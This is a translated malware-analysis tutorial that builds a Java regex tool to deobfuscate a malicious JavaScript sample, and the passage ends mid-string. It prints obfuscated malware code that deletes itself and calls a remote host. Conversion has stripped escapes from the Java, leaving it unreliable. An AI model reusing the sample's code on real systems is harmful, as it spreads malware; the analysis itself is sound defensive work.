> 原文链接: https://www.anquanke.com//post/id/207813 


# 探索如何使用自动化实现对恶意JavaScript脚本的反混淆处理


                                阅读量   
                                **145879**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者maxkersten，文章来源：maxkersten.nl
                                <br>原文地址：[https://maxkersten.nl/binary-analysis-course/analysis-scripts/javascript-string-concatenation-deobfuscation/](https://maxkersten.nl/binary-analysis-course/analysis-scripts/javascript-string-concatenation-deobfuscation/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t011a6db231c34d9fe5.jpg)](https://p0.ssl.qhimg.com/t011a6db231c34d9fe5.jpg)



## 一、前言

对恶意样本进行反混淆处理可能是一项比较繁琐的任务。为了减少这项任务所花费的时间，研究人员们正不断尝试进行自动化的反混淆处理。在本文中，我们将首先分析脚本中的四种不同混淆类型，并探讨如何在正则表达式的帮助下对其进行反混淆。在这里，我们将逐步分析反混淆过程，并尝试设计对应的反混淆工具。在成功进行了所有的反混淆工作之后，我们就能够对恶意软件样本本身的功能进行分析。这里我们选用了一个较小的样本，尽管针对这个样本是可以手动对其进行反混淆处理的，但我们会以此为例，来探讨如何让这个过程实现自动化。



## 二、样本信息

这个JavaScript恶意软件由包含四个文件的软件包组成，曾经在野外传播。其中的第二个文件中包含未加注释的美化后代码，第三个文件包含反混淆的代码，第四个文件包含反混淆代码的重构版本。我们可以从MalShare、Malware Bazaar或VirusBay下载示例的软件包。

```
JavaScript MD-5: b9eaab6939e533fcc55c3e53d8a93c1c
JavaScript SHA-1: ebf4ee7caa5f1fdf669eae33201a3ef2c43a57d7
JavaScript SHA-256: 908721abc193d0d709baf8f791dbaa09a6b4414ca6020f6fad1ba8aa7dddd6e5

Package MD-5: 2d169c43c42f102d00f3c25e821b7199
Package SHA-1: ef78c857a658445688f98d7ed1d346834594295f
Package SHA-256: 0521fe4d7dd2fb540580f981fa28196c23f0dd694572172f183b7869c1c072b5
```

该样本是由一位匿名的研究人员与我分享的，在这里要感谢这位研究人员。



## 三、初步分析

在查看脚本的文件大小后，我们发现其超过90KB，这个脚本相对比较大。但打开文件后，我们只看到了一行很长的代码。在美化代码时，开发者很明显地将恶意代码放在了两个合法的注释代码之间。下面是部分恶意代码的节选。

```
/Comment that contains code from jQuery/
try `{`
var rhepu = getAXO((“w”, “b”, “S”) + (“f”, “I”, “u”, “h”, “B”, “c”) + (“m”, “O”, “r”) + (“Q”, “z”, “i”) + (“m”, “q”, “X”, “p”, “r”, “p”) + [“v”, “I”, “S”, “t”, “l”][(949 - 946)] + (“e”, “b”, “I”, “y”, “i”) + (“e”, “g”, “S”, “T”, “Z”, “n”) + [“o”, “g”, “u”][(-531 + 532)] + “.” + [“F”, “E”][(200 - 200)] + “i” + “l” + (“m”, “V”, “U”, “c”, “e”) + (“b”, “n”, “o”, “S”) + “y” + (“o”, “q”, “A”, “c”, “J”, “s”) + (“m”, “k”, “G”, “t”) + (“v”, “o”, “r”, “e”) + (“k”, “w”, “m”) + [“O”, “n”][(899 - 899)] + “b” + “j” + “e” + “c” + [“t”, “N”][(290 - 290)]);
rhepu“D” + “e” + (“W”, “y”, “F”, “j”, “j”, “l”) + (“P”, “u”, “G”, “G”, “a”, “e”) + [“m”, “R”, “z”, “o”, “t”, “E”][(-393 + 397)] + [“n”, “B”, “e”, “z”, “e”][(668 - 666)] + “F” + (“d”, “f”, “i”) + (“u”, “i”, “F”, “a”, “m”, “l”) + [“e”, “F”, “T”, “e”][(-643 + 643)] + (“B”, “C”, “i”, “S”) + “c” + (“T”, “c”, “H”, “p”, “Q”, “r”) + “i” + (“m”, “u”, “p”) + [“q”, “t”, “A”, “M”, “r”, “K”, “a”][(-185 + 186)]][
[“m”, “P”, “S”, “K”, “O”, “O”][(-757 + 759)] + (“c”, “b”, “c”) + [“r”, “g”][(-321 + 321)] + [“D”, “v”, “H”, “i”, “d”, “a”, “A”][(847 - 844)] + (“C”, “d”, “k”, “p”) + [“i”, “t”, “p”][(115 - 114)] + (“R”, “H”, “z”, “d”, “r”, “F”) + “u” + “l” + “l” + “N” + “a” + “m” + (“Q”, “m”, “W”, “W”, “e”)
], true);
`}` catch (e) `{``}`
var zuqyljaah = (“u”, “T”, “k”, “h”) + [“t”, “G”, “H”, “M”, “X”, “n”][(-130 + 130)] + [“t”, “E”, “r”, “T”][(-854 + 854)] + “p” + “:” + “/“ + “/“ + [“6”, “B”][(-689 + 689)] + “0” + (“s”, “M”, “a”, “e”) + “a” + [“s”, “t”, “H”, “y”, “p”, “0”, “b”][(395 - 390)] + [“d”, “2”, “P”, “m”][(-362 + 363)] + [“H”, “c”, “W”, “6”, “w”][(874 - 871)] + (“X”, “s”, “0”) + “.” + “a” + (“Y”, “U”, “Y”, “J”, “s”, “u”) + “t” + (“v”, “E”, “k”, “t”, “G”, “h”) + “.” + [“G”, “H”, “c”, “q”][(-698 + 700)] + (“t”, “U”, “X”, “o”) + (“u”, “p”, “d”) + “i” + “n” + [“g”, “u”, “Y”][(-279 + 279)] + (“L”, “D”, “e”, “t”, “b”) + (“L”, “T”, “i”) + “t” + “.” + “c” + “o” + “.” + (“u”, “R”, “u”, “i”) + “n” + “/“ + [“P”, “v”, “x”, “s”, “r”, “c”, “r”][(-350 + 353)] + (“j”, “G”, “u”) + [“j”, “R”, “b”, “q”][(312 - 310)] + (“N”, “l”, “k”, “N”, “R”, “m”) + (“I”, “K”, “i”) + (“W”, “o”, “j”, “e”, “t”) + “.” + “a” + [“E”, “z”, “k”, “f”, “s”, “U”][(-412 + 416)] + [“m”, “j”, “v”, “p”, “g”][(-354 + 357)] + (“o”, “s”, “w”, “x”);
var tid = [“5”, “O”][(-765 + 765)] + (“R”, “m”, “l”, “f”, “z”, “0”) + (“L”, “C”, “g”, “g”, “0”);
var r8h = [“S”, “g”, “a”, “L”, “r”][(202 - 200)] + “a” + (“c”, “H”, “L”, “m”, “d”) + “2” + “8” + (“q”, “y”, “O”, “0”) + (“y”, “Y”, “a”, “o”, “a”) + (“x”, “B”, “p”, “p”, “9”);
var gudel6 = [];
gudel6(“A”, “F”, “p”) + “u” + “s” + [“A”, “u”, “h”, “m”][(584 - 582)]](tid);
var kbiag = womzyjeptfu();
var jybspikivsu = kbiag + (224 - (-9776));
while (kbiag &lt; jybspikivsu) `{`
kbiag = womzyjeptfu();
this[(“T”, “a”, “w”, “V”, “W”) + [“h”, “S”, “G”, “I”, “z”][(-666 + 667)] + (“x”, “C”, “u”, “q”, “c”) + [“r”, “Y”][(-326 + 326)] + [“S”, “t”, “i”, “g”, “f”, “Y”][(-190 + 192)] + (“b”, “q”, “p”) + “t”]“S” + “l” + (“u”, “C”, “e”) + “e” + [“p”, “U”, “s”, “E”, “R”][(-375 + 375)]));
`}`
//More code is omitted due to brevity
/More jQuery code that is commented out/
```

如果删除这两个注释，将不会影响脚本的功能，但是会将其大小从90KB减小到8KB左右。大多数文本编辑器在处理较小文件时会更加流畅。恶意开发者之所以将合法代码添加为注释，是为了减少规则或扫描程序检测到恶意软件样本的概率。



## 四、混淆技术分析

我们需要解决脚本中存在的四种混淆类型。请注意，这里所说的“字符”并不是指“字符类型”的变量，而是指一个字符大小的字符串。

### <a class="reference-link" name="4.1%20%E9%80%97%E5%8F%B7%E8%BF%90%E7%AE%97%E7%AC%A6"></a>4.1 逗号运算符

根据Mozilla的记录，每个表达式都会被计算出结果，但是仅会返回最后一个表达式。这样一来，就仅返回最后一个字符。示例如下：

```
("w", "b", "S")
```

由于存在未使用的字符串，因此这种技术会在其中添加无效代码。方括号用于在另一个字符串中包含逗号运算符。

### <a class="reference-link" name="4.2%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84"></a>4.2 字符串数组

第二种方法是使用字符串数组，而实际仅仅会使用数组中的一个字符。基于索引的方式，从数组中选择出实际使用的字符，该索引则使用两个数字来计算，以下是一个例子。

```
["v", "I", "S", "t", "l"][(949 - 946)]
```

在这里，计算索引的运算符可以是加号或者减号。

### <a class="reference-link" name="4.3%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%B2%E8%81%94"></a>4.3 字符串串联

通常，恶意开发者会将字符串进行连接，以确保在查找特定规则对应的完整字符串时找不到匹配项，从而不会触发规则。如果选择逐一去匹配单个字符，将会产生较多的误报。下面给出一个例子。

```
"l" + "e" + "n" + "g" + "t" + "h"
```

在这种情况下，使用逗号运算符技术或字符串数组技术，也可以将一些单个字符串串联起来。

### <a class="reference-link" name="4.4%20%E7%AE%80%E5%8C%96%E8%A1%A8%E8%BE%BE%E5%BC%8F"></a>4.4 简化表达式

除了可以使用表达式对字符串数组中的特定字符进行索引之外，脚本中的其他整数也都使用类似的表达式来代替。下面给出一个例子。

```
82 - (-118)
```

在这里，运算符可以是加或减，其中的数字也可以是负数。



## 五、自动化反混淆

在这一章中，我们将说明如何使用与不同混淆技术相对应的正则表达式。随后，我们将使用这些正则表达式来自动消除脚本中的混淆。这一自动化过程将使用Java来完成。<br>
反混淆的先后顺序非常重要，因为对字符串串联的反混淆过程应该在逗号运算符和字符串数组两种类型反混淆之后再进行。

### <a class="reference-link" name="5.1%20Java%E8%87%AA%E5%8A%A8%E5%8C%96"></a>5.1 Java自动化

由于代码中的某些部分会在多个函数中重复使用，因此首先将介绍整体的代码实现结构。在这里，无需其他库，即可运行自动化代码。<br>
每个函数都需要完整的脚本作为输入的字符串。在处理完所有匹配项之后，函数将返回该字符串的修改后版本。下面给出了用于迭代正则表达式的所有匹配项的Java代码。

```
Pattern pattern = Pattern.compile("[pattern_here]");
Matcher matcher = pattern.matcher(script);

while (matcher.find()) `{`
    //Iterate through all matches
`}`
```

请注意，在匹配器中包含一组函数。如果不带参数调用，则返回完全匹配项；如果给定一个整数作为其参数，则返回特定的匹配器分组。此外，正则表达式的转义字符是反斜杠，在这里需要在Java字符串中对反斜杠字符进行转义，那么也就需要额外再加一个反斜杠来完成。<br>
为了避免多次包含“”” + variable + “””，我们定义并使用了一个名为`encapsulate`的函数，该函数（包括说明）在下面给出。

```
/**
 * Encapsulates the given string in quotes
 *
 * @param input the string to encapsulate between quotes
 * @return the encapsulated string
 */
private static String encapsulate(String input) `{`
    return """ + input + """;
`}`
```

如果要包含引号，则需要使用反斜杠对引号进行转义。

### <a class="reference-link" name="5.2%20%E5%A4%84%E7%90%86%E9%80%97%E5%8F%B7%E8%BF%90%E7%AE%97%E7%AC%A6"></a>5.2 处理逗号运算符

使用逗号运算符分割的所有字符串都保留在方括号之中，在其后面是每个字符串，并使用命令和空格作为分隔符。必须要匹配一个左方括号和引号，之后字母、数字、引号、逗号、空格会重复出现，因此我们可以使用以下的正则表达式。

```
("[" a-zA-Z0-9,]+)
```

该内容与上述模式匹配，直至遇到右括号为止。在这里，使用反斜杠对括号进行了转义，以避免将其进行误处理。<br>
引号之间的最后一个字符串由逗号运算符返回，这意味着引号最后一次出现的索引减去1就是返回字符的索引。这样一来，lastindexOf函数可用于获取匹配项之中的索引。在提取单个字符后，需要对其进行封装。使用替换函数，可以替换掉所有完全匹配项。下面给出了对应的Java代码。

```
private static String removeCommaOperatorSequences(String script) `{`
    Pattern pattern = Pattern.compile("\("[" a-zA-Z0-9,]+\)");
    Matcher matcher = pattern.matcher(script);
    while (matcher.find()) `{`
        String match = matcher.group();
        int lastIndex = match.lastIndexOf(""");
        String result = match.substring(lastIndex - 1, lastIndex);
        result = encapsulate(result);
        script = script.replace(match, result);
    `}`
    return script;
`}`

```

### <a class="reference-link" name="5.3%20%E5%A4%84%E7%90%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84"></a>5.3 处理字符串数组

数组序列始终以方括号开头，之后声明所有字符串。最后，以方括号结束。要匹配这种模式，需要查找字母、数字、空格、引号、加号和逗号。所有这些都包含在方括号之间，并且会重复一次或多次。下面的正则表达式与之匹配。

```
[[a-zA-Z0-9 "+,]+]
```

字符的索引被放在方括号之间。在这些方括号内，使用普通括号将索引值的表达式括起来。在脚本中，第一个数字可能是负数，因此我们在最开始使用了`-?`，表示会有0个或1个`-`字符出现。索引的正则表达式如下：

```
[(-?d+[ +-]+d+)]
```

为了匹配出现的字符串数组，需要将两个正则表达式放在一起。下面的代码遍历所有匹配项，并为每个匹配项调用两个函数——`getIndex`和`getCharacters`。这两个函数都需要一个匹配项作为输入，并以整数值返回索引，分别返回一个包含字符串数组的字符串列表。然后，将完全匹配的项替换为指定索引处的字符。代码如下：

```
private static String removeStringArraySequences(String script) `{`
    Pattern pattern = Pattern.compile("\[[a-zA-Z0-9 "+,]+\]\[\(-?\d+[ +-]+\d+\)\]");
    Matcher matcher = pattern.matcher(script);
    while (matcher.find()) `{`
        String match = matcher.group();
        int index = getIndex(match);
        List&lt;String&gt; characters = getCharacters(match);
        script = script.replace(match, characters.get(index));
    `}`
    return script;
`}`

```

getIndex函数用于从索引部分提取两个数字以及所使用的操作数。通过使用三个不同的捕获组，可以轻松地从指定的输入中提取所需的数据。第一个是潜在的负数，第二个捕获组是运算符，可以是减号或加号。请注意，运算符的前面和后面都是未捕获的空格。最后，第二个数字被捕获，正则表达式如下：

```
([-?d]+) ([-+]) ([d]+)
```

在实现自动化时，必须获取两个数字，并根据操作数确定是否应该进行加法或减法。其实现代码如下：

```
private static int getIndex(String input) `{`
    Pattern pattern = Pattern.compile("([-?\d]+) ([-+]) ([\d]+)");
    Matcher matcher = pattern.matcher(input);
    int result = -1;
    while (matcher.find()) `{`
        int number1 = Integer.parseInt(matcher.group(1));
        String operand = matcher.group(2);
        int number2 = Integer.parseInt(matcher.group(3));
        if (operand.equals("-")) `{`
            result = number1 - number2;
        `}` else if (operand.equals("+")) `{`
            result = number1 + number2;
        `}`
    `}`
    return result;
`}`
```

请注意，由于字符列表中没有`-1`的索引，因此返回值可能为`-1`，这将会引发错误。由于该代码仅适用于特定脚本，因此我们没有再进行进一步的错误处理。<br>
要从字符串数组中获取所有字符，必须匹配引号之间的所有字符。下面是正则表达式：

```
"(S`{`1`}`)"
```

这个正则表达式在引号之间匹配了一个非空格字符，因为该脚本中的数组每个索引仅包含一个字符。然后，将每个完全匹配项添加到列表中，最后将其返回。代码如下：

```
private static List&lt;String&gt; getCharacters(String input) `{`
    List&lt;String&gt; output = new ArrayList&lt;&gt;();
    Pattern pattern = Pattern.compile(""(\S`{`1`}`)"");
    Matcher matcher = pattern.matcher(input);
    while (matcher.find()) `{`
        output.add(matcher.group());
    `}`
    return output;
`}`
```

同样，在这里也暂时没有进行错误处理。

### <a class="reference-link" name="5.4%20%E5%A4%84%E7%90%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%B2%E8%81%94"></a>5.4 处理字符串串联

由于目前已经处理了逗号运算符和字符串数组的部分，因此可以使用这个正则表达式来匹配所有由加号连接的字符串。在这里，需要匹配字母、数字、空格、加号、点、正斜杠和冒号。在脚本中没有其他字符，因此不需要在这里包含这些字符，下面是正则表达式：

```
"[a-zA-Z0-9 "+./:]+
```

最初匹配的是一个引号，然后应该紧跟着一个或多个指定字符。然后，可以使用split函数根据空格、加号、空格的模式进行拆分。该函数以字符串形式的正则表达式作为输入，这意味着加号需要使用反斜杠进行转义，也就是需要在Java字符串中使用附加的反斜杠。然后，字符串数组包含所有字符，包括其两边的引号。使用替换函数可以将其删除。输出应该存储在单独的字符串中，并在字符串末尾加上引号。然后，应该使用串联的字符串替换完全匹配的项目。代码如下：

```
private static String concatenateStrings(String script) `{`
    Pattern pattern = Pattern.compile(""[a-zA-Z0-9 "+.\/:]+)";
    Matcher matcher = pattern.matcher(script);
    while (matcher.find()) `{`
        String match = matcher.group();
        String result = "";
        String[] characterArray = match.split(" \+ ");
        for (String character : characterArray) `{`
            character = character.replace(""", "");
            result += character;
        `}`
        result = encapsulate(result);
        script = script.replace(match, result);
    `}`
    return script;
`}`

```

### <a class="reference-link" name="5.5%20%E7%AE%80%E5%8C%96%E8%A1%A8%E8%BE%BE%E5%BC%8F"></a>5.5 简化表达式

要将脚本中的其他数字恢复为原始值，需要匹配三项内容的正则表达式：第一个数字、运算符、第二个数字。由于在完整的表达式和数字两边都使用了方括号，因此重要的是不要破坏任何内容。这样一来，外部的样式就可以保持原样。这将会创建一个额外的捕获组，因为在匹配过程中使用了外部的括号。正则表达式如下：

```
((([-]*d+)[ ]([+-])[ (]*([-]*d+)))
```

这里的第一个捕获组是不带括号的完整匹配，第二个捕获组是第一个数字，第三个捕获组是操作数，第四个捕获组是第二个数字。如前所述，根据操作数来计算加法或减法的结果，然后将其替换。代码如下：

```
private static String simplifyEquations(String script) `{`
    Pattern pattern = Pattern.compile("\((([-]*\d+)[ ]([+-])[ (]*([-]*\d+))\)");
    Matcher matcher = pattern.matcher(script);
    while (matcher.find()) `{`
        String match = matcher.group(1);
        int number1 = Integer.parseInt(matcher.group(2));
        String operand = matcher.group(3);
        int number2 = Integer.parseInt(matcher.group(4));
        String result = "";
        if (operand.equals("-")) `{`
            result += number1 - number2;
        `}` else if (operand.equals("+")) `{`
            result += number1 + number2;
        `}`
        if (match.contains("(")) `{`
            match += ")";
        `}`
        script = script.replace(match, result);
    `}`
    return script;
`}`
```

请注意，结果变量是以字符串的形式，因为replace函数仅适用于字符串，不适用于整数。此外，如果脚本中包含一个中括号，那么在替换调用前应该添加一个中括号，否则打开的括号会多于要关闭的括号，从而导致脚本中出现语法错误。



## 六、完整脚本代码

要将上面的所有实现拼接在一起，还需要一个main函数。完整的代码如下所示，这里的main函数使用上述我们编写的函数来更改脚本，该脚本最终会打印到标准输出中。

```
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * This deobfuscator is part of my Binary Analysis Course, which can be found
 * here: https://maxkersten.nl/binary-analysis-course/
 *
 * More specifically, this code is related to this article:
 * https://maxkersten.nl/binary-analysis-course/analysis-scripts/javascript-string-concatenation-deobfuscation/
 *
 * @author Max 'Libra' Kersten
 */
public class SomeJavaScriptDeobfuscator `{`

    /**
     * The main function gets the script, after which it calls the removal and
     * simplify functions. At last, the deobfuscated script is printed to the
     * standard output.
     */
    public static void main(String[] args) `{`
        //Gets the script
        String script = getScript();

        //Remove things like ("w", "b", "S")
        script = removeCommaOperatorSequences(script);

        //Remove patterns like ["v", "I", "S", "t", "l"][(949 - 946)]
        script = removeStringArraySequences(script);

        //Remove patterns like "l" + "e" + "n" + "g" + "t" + "h"
        script = concatenateStrings(script);

        //Remove equations like 82 - (-118)
        script = simplifyEquations(script);

        //Print the modified script to the standard output stream
        System.out.println(script);
    `}`

    /**
     * Replaces equations with their outcome using
     * &lt;code&gt;((([-]*d+)[ ]([+-])[ (]*([-]*d+)))&lt;/code&gt; as a regular
     * expression.
     *
     * An example of such an equation is &lt;code&gt;82 - (-118)&lt;/code&gt;
     *
     * @param script the script to modify
     * @return the modified script
     */
    private static String simplifyEquations(String script) `{`
        //The regular expression to match: ((([-]*d+)[ ]([+-])[ (]*([-]*d+)))
        Pattern pattern = Pattern.compile("\((([-]*\d+)[ ]([+-])[ (]*([-]*\d+))\)");
        //The string to match
        Matcher matcher = pattern.matcher(script);
        //Iterate through all occurrences
        while (matcher.find()) `{`
            //Get the full match
            String match = matcher.group(1);
            //Get the first number in the equation
            int number1 = Integer.parseInt(matcher.group(2));
            //Get the operand within the equation
            String operand = matcher.group(3);
            //Get the second number in the equation
            int number2 = Integer.parseInt(matcher.group(4));
            /**
             * Declare the variable to store the result in. The type is a
             * string, as the replace function expects a string and not an
             * integer
             */
            String result = "";
            /**
             * If the operand equals minus, the second number is deducted from
             * the first number. If the operand equals plus, it is added.
             */
            if (operand.equals("-")) `{`
                result += number1 - number2;
            `}` else if (operand.equals("+")) `{`
                result += number1 + number2;
            `}`
            /**
             * If the full match contains an opening bracket, it is missing the
             * closing bracket, meaning it should be added to avoid breaking the
             * input script's functionality
             */
            if (match.contains("(")) `{`
                match += ")";
            `}`
            //Replace the match with the result in the script, and store the result in the script variable
            script = script.replace(match, result);
            //Continue to the next match
        `}`
        //Once all matches have been replaced, the altered script is returned
        return script;
    `}`

    /**
     * Concatenates characters using &lt;code&gt;"[a-zA-Z0-9 "+./:]+&lt;/code&gt; as a
     * regular expression.
     *
     * An example occurrence is &lt;code&gt;"l" + "e" + "n" + "g" + "t" + "h"&lt;/code&gt;
     *
     * @param script the script to modify
     * @return the modified script
     */
    private static String concatenateStrings(String script) `{`
        //The regular expression to match: "[a-zA-Z0-9 "+./:]+
        Pattern pattern = Pattern.compile(""[a-zA-Z0-9 "+.\/:]+");
        //The string to match with the given regular expression
        Matcher matcher = pattern.matcher(script);
        //Iterate through all matches
        while (matcher.find()) `{`
            //Get the complete match
            String match = matcher.group();
            //Create the result variable
            String result = "";
            /**
             * Split the match based upon a space, a plus, and a space. The
             * split function takes the input as a regular expression, meaning
             * the plus sign needs to be escaped with a backslash (which is also
             * escaped in a Java string, hence the two backslashes)
             */
            String[] characterArray = match.split(" \+ ");
            //Iterate through all entries in the array
            for (String character : characterArray) `{`
                //Replace the occurrence of quotes with nothing, effectively removing the quotes
                character = character.replace(""", "");
                //Append the character to the output
                result += character;
            `}`
            //Put the result between quotes
            result = encapsulate(result);
            //Replace the full match with the result
            script = script.replace(match, result);
            //Continue to the next match
        `}`
        //When all matches have been processed, the altered script is returned
        return script;
    `}`

    /**
     * Removes the string array and its index selection using
     * &lt;code&gt;[[a-zA-Z0-9 "+,]+][(-?d+[ +-]+d+)]&lt;/code&gt; as a regular
     * expression.
     *
     * An example occurrence is
     * &lt;code&gt;["v", "I", "S", "t", "l"][(949 - 946)]&lt;/code&gt;
     *
     * @param script the script to modify
     * @return the modified script
     */
    private static String removeStringArraySequences(String script) `{`
        //Sets the regular expression: [[a-zA-Z0-9 "+,]+][(-?d+[ +-]+d+)]
        Pattern pattern = Pattern.compile("\[[a-zA-Z0-9 "+,]+\]\[\(-?\d+[ +-]+\d+\)\]");
        //Sets the string to match
        Matcher matcher = pattern.matcher(script);
        //Iterate through all matches
        while (matcher.find()) `{`
            //Get the full match
            String match = matcher.group();
            //Get the index from the match using the getIndex function
            int index = getIndex(match);
            //Gets all characters from match using the getCharacters function
            List&lt;String&gt; characters = getCharacters(match);
            //Replace the occurrence of the full match using the character that is present at the index
            script = script.replace(match, characters.get(index));
            //Continue to iterate through all matches
        `}`
        //Return the altered script once all matches have been processed
        return script;
    `}`

    /**
     * Gets all characters from the array in the given input string (which is a
     * match based on &lt;code&gt;[[a-zA-Z0-9 "+,]+][(-?d+[ +-]+d+)]&lt;/code&gt;)
     *
     * @param input a match of
     * &lt;code&gt;[[a-zA-Z0-9 "+,]+][(-?d+[ +-]+d+)]&lt;/code&gt;
     * @return a list of all characters
     */
    private static List&lt;String&gt; getCharacters(String input) `{`
        //Declare and instantiate a new list
        List&lt;String&gt; output = new ArrayList&lt;&gt;();
        //The regular expression to match: "(S`{`1`}`)"
        Pattern pattern = Pattern.compile(""(\S`{`1`}`)"");
        //The string to match
        Matcher matcher = pattern.matcher(input);
        //Iterate through all matches
        while (matcher.find()) `{`
            //Add the full match to the output list
            output.add(matcher.group());
            //Continue to iterate through all matches
        `}`
        //Return the list of characters
        return output;
    `}`

    /**
     * Gets the index based on the two numbers and their operand in a match of
     * &lt;code&gt;[[a-zA-Z0-9 "+,]+][(-?d+[ +-]+d+)]&lt;/code&gt;
     *
     * @param input a match of
     * &lt;code&gt;[[a-zA-Z0-9 "+,]+][(-?d+[ +-]+d+)]&lt;/code&gt;
     * @return the index
     */
    private static int getIndex(String input) `{`
        //The regular expression to match: ([-?d]+) ([-+]) ([d]+)
        Pattern pattern = Pattern.compile("([-?\d]+) ([-+]) ([\d]+)");
        //The string to match
        Matcher matcher = pattern.matcher(input);
        //The variable to store the result in
        int result = -1;
        //Iterate through all matches
        while (matcher.find()) `{`
            //Get the first number
            int number1 = Integer.parseInt(matcher.group(1));
            //Get the operand (either a plus or a minus)
            String operand = matcher.group(2);
            //Get the second number
            int number2 = Integer.parseInt(matcher.group(3));
            //Check the value of the operand
            if (operand.equals("-")) `{`
                //If the operand is a minus, the second number is subtracted from the first
                result = number1 - number2;
            `}` else if (operand.equals("+")) `{`
                //If the operand is a plus, the two numbers are added together
                result = number1 + number2;
            `}`
        `}`
        return result;
    `}`

    /**
     * Removes all comma operator parts in the script using
     * &lt;code&gt;("[" a-zA-Z0-9,]+)&lt;/code&gt; as a regular expression
     *
     * An example of such an operator is &lt;code&gt;("w", "b", "S")&lt;/code&gt;.
     *
     * @param script the script to modify
     * @return the modified script
     */
    private static String removeCommaOperatorSequences(String script) `{`
        //The regular expression to match: ("[" a-zA-Z0-9,]+)
        Pattern pattern = Pattern.compile("\("[" a-zA-Z0-9,]+\)");
        //The string to match the regular expression on
        Matcher matcher = pattern.matcher(script);
        //Iterate through all matches
        while (matcher.find()) `{`
            //Get the full match
            String match = matcher.group();
            //Find the last index of a quote
            int lastIndex = match.lastIndexOf(""");
            //Get the character before the last occurrence of a quote (meaning the character)
            String result = match.substring(lastIndex - 1, lastIndex);
            //Encapsulate the character
            result = encapsulate(result);
            //Replace the match with the encapsulated character
            script = script.replace(match, result);
            //Continue to the next match
        `}`
        //Return the altered script once all matches are processed
        return script;
    `}`

    /**
     * Encapsulates the given string in quotes
     *
     * @param input the string to encapsulate between quotes
     * @return the encapsulated string
     */
    private static String encapsulate(String input) `{`
        return """ + input + """;
    `}`

    /**
     * Gets the script
     *
     * @return the script in the form of a string
     */
    public static String getScript() `{`
        return "try `{`n"
                + "    var rhepu = getAXO(("w", "b", "S") + ("f", "I", "u", "h", "B", "c") + ("m", "O", "r") + ("Q", "z", "i") + ("m", "q", "X", "p", "r", "p") + ["v", "I", "S", "t", "l"][(949 - 946)] + ("e", "b", "I", "y", "i") + ("e", "g", "S", "T", "Z", "n") + ["o", "g", "u"][(-531 + 532)] + "." + ["F", "E"][(200 - 200)] + "i" + "l" + ("m", "V", "U", "c", "e") + ("b", "n", "o", "S") + "y" + ("o", "q", "A", "c", "J", "s") + ("m", "k", "G", "t") + ("v", "o", "r", "e") + ("k", "w", "m") + ["O", "n"][(899 - 899)] + "b" + "j" + "e" + "c" + ["t", "N"][(290 - 290)]);n"
                + "    rhepu["D" + "e" + ("W", "y", "F", "j", "j", "l") + ("P", "u", "G", "G", "a", "e") + ["m", "R", "z", "o", "t", "E"][(-393 + 397)] + ["n", "B", "e", "z", "e"][(668 - 666)] + "F" + ("d", "f", "i") + ("u", "i", "F", "a", "m", "l") + ["e", "F", "T", "e"][(-643 + 643)]](this[("J", "w", "x", "J", "W") + ("B", "C", "i", "S") + "c" + ("T", "c", "H", "p", "Q", "r") + "i" + ("m", "u", "p") + ["q", "t", "A", "M", "r", "K", "a"][(-185 + 186)]][n"
                + "        ["m", "P", "S", "K", "O", "O"][(-757 + 759)] + ("c", "b", "c") + ["r", "g"][(-321 + 321)] + ["D", "v", "H", "i", "d", "a", "A"][(847 - 844)] + ("C", "d", "k", "p") + ["i", "t", "p"][(115 - 114)] + ("R", "H", "z", "d", "r", "F") + "u" + "l" + "l" + "N" + "a" + "m" + ("Q", "m", "W", "W", "e")n"
                + "    ], true);n"
                + "`}` catch (e) `{``}`n"
                + "var zuqyljaah = ("u", "T", "k", "h") + ["t", "G", "H", "M", "X", "n"][(-130 + 130)] + ["t", "E", "r", "T"][(-854 + 854)] + "p" + ":" + "/" + "/" + ["6", "B"][(-689 + 689)] + "0" + ("s", "M", "a", "e") + "a" + ["s", "t", "H", "y", "p", "0", "b"][(395 - 390)] + ["d", "2", "P", "m"][(-362 + 363)] + ["H", "c", "W", "6", "w"][(874 - 871)] + ("X", "s", "0") + "." + "a" + ("Y", "U", "Y", "J", "s", "u") + "t" + ("v", "E", "k", "t", "G", "h") + "." + ["G", "H", "c", "q"][(-698 + 700)] + ("t", "U", "X", "o") + ("u", "p", "d") + "i" + "n" + ["g", "u", "Y"][(-279 + 279)] + ("L", "D", "e", "t", "b") + ("L", "T", "i") + "t" + "." + "c" + "o" + "." + ("u", "R", "u", "i") + "n" + "/" + ["P", "v", "x", "s", "r", "c", "r"][(-350 + 353)] + ("j", "G", "u") + ["j", "R", "b", "q"][(312 - 310)] + ("N", "l", "k", "N", "R", "m") + ("I", "K", "i") + ("W", "o", "j", "e", "t") + "." + "a" + ["E", "z", "k", "f", "s", "U"][(-412 + 416)] + ["m", "j", "v", "p", "g"][(-354 + 357)] + ("o", "s", "w", "x");n"
                + "var tid = ["5", "O"][(-765 + 765)] + ("R", "m", "l", "f", "z", "0") + ("L", "C", "g", "g", "0");n"
                + "var r8h = ["S", "g", "a", "L", "r"][(202 - 200)] + "a" + ("c", "H", "L", "m", "d") + "2" + "8" + ("q", "y", "O", "0") + ("y", "Y", "a", "o", "a") + ("x", "B", "p", "p", "9");n"
                + "var gudel6 = [];n"
                + "gudel6[("A", "F", "p") + "u" + "s" + ["A", "u", "h", "m"][(584 - 582)]](["k", "a", "h"][(-497 + 498)]);n"
                + "gudel6[["d", "p", "E", "i"][(37 - 36)] + "u" + ["s", "h", "K"][(935 - 935)] + ("t", "O", "h")](tid);n"
                + "var kbiag = womzyjeptfu();n"
                + "var jybspikivsu = kbiag + (224 - (-9776));n"
                + "while (kbiag &lt; jybspikivsu) `{`n"
                + "    kbiag = womzyjeptfu();n"
